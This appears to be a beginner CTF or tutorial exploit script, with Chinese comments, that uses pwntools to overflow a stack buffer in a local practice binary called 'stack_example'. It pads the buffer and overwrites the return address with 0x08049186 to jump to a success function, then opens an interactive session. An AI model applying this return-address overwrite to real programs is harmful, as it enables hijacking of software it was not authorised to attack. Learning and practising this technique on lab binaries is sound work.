##coding=utf8
from pwn import *
## 构造与程序交互的对象
sh = process('./stack_example')
# 远程 remote("ip", port)
success_addr = 0x08049186
## 构造payload
payload = 'a' * 0x14 + 'bbbb' + p32(success_addr) 
# p32 把整数打包成32bit的字节数据
print p32(success_addr)
## 向程序发送字符串
sh.sendline(payload)
## 将代码交互转换为手工交互
sh.interactive()
